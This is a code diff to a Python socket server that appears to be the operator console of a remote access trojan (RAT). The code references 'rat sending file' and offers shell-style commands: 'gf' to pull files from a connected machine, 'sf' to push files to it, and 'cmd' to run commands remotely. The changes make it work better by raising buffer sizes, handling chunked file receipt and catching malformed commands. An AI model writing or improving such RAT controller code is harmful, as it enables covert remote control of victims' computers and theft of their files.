@@ -53,13 +53,18 @@ def get_ipv4_address():
         return ip_address
 
 
-byte_size = 500 * 1024 * 1024
+BYTE_SIZE = 700 * 1024 * 1024
+
+HOST = "localhost"
+
+PORT = 8080
+
 
 ip_address = get_ipv4_address()
 
 ip_address="localhost"
 
-socket.bind((ip_address, 8080))
+socket.bind((HOST, PORT))
 
 socket.listen(2)
 
@@ -74,44 +79,78 @@ def create_file_name():
     return f"{str(datetime.now().strftime('%Y%m%d_%H%M%S'))}"
 
 
-def save_file(data,file_format):
+def save_file(client,file_format):
     filename = create_file_name()
     with open(f"{filename}{file_format}", 'wb') as file:
-        file.write(data)
-        print(f"{Fore.GREEN}{filename} Saved!")
+        ch = client.recv(BYTE_SIZE)
+        while (ch):
+            file.write(ch)
+            print(ch)
+            if b'rat sending file = 0' in ch:
+                break
+            ch = client.recv(1024)
+        print(f"{Fore.GREEN}File Saved!")
 
 
 
 
 while True:
     print(f"Command Format : function name!command|value")
+
     shell = input("Shell > :")
 
-    function_name, value = shell.split("!")
+    try:
+        function_name, value = shell.split("!")
+    except ValueError:
+        print("Invalid Command Format")
+        continue
 
     if function_name=="gf":
+      
       client.send(shell.encode())
-      filename, file_format = splitext(value)
-      response = client.recv(byte_size)
-      save_file(response,file_format)
 
-    if function_name=="sf":
+      filename, file_format = splitext(value)
+
+      save_file(client,file_format)
+
+
+    elif function_name=="sf":
+
         client.send(shell.encode())
+
         file_path = value.split("#")
+
         with open(file_path, 'rb') as file:
+
             filename, file_format = splitext(value)
+
             send_shell  = f"sf!{file.read()}#{file_format}"
+
             client.send(send_shell.encode())
         
-        response = client.recv(byte_size).decode('UTF-8', errors='ignore')
+        response = client.recv(BYTE_SIZE).decode(
+            'UTF-8', 
+            errors='ignore'
+        )
         print(response)
 
-    if function_name=="cmd":
+    elif function_name=="cmd":
+
         client.send(shell.encode())
-        response = client.recv(byte_size).decode('UTF-8', errors='ignore')
+
+        response = client.recv(BYTE_SIZE).decode(
+            'UTF-8',
+            errors='ignore'
+        )
         print(response)
     
     else:
+
         client.send(shell.encode())
-        response = client.recv(byte_size).decode('UTF-8', errors='ignore')
+
+        response = client.recv(BYTE_SIZE).decode(
+            'UTF-8',
+            errors='ignore'
+        )
+
         print(response)
